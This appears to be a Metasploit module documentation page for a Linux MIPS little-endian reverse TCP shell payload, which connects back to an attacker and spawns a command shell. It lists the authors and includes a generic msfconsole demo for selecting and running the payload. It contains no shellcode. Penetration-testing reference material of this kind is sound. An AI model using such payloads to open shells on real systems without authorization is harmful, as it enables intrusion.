## Linux Command Shell, Reverse TCP Inline

Connect back to attacker and spawn a command shell


## Module Name
payload/linux/mipsle/shell_reverse_tcp

## Authors
* rigan <imrigan[at]gmail.com>
* juan vazquez





## Platforms
linux

## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use payload/linux/mipsle/shell_reverse_tcp
msf payload(shell_reverse_tcp) > show targets
   ... a list of targets ...
msf payload(shell_reverse_tcp) > set TARGET <target-id>
msf payload(shell_reverse_tcp) > show options
   ... show and set options ...
msf payload(shell_reverse_tcp) > run
```
    
    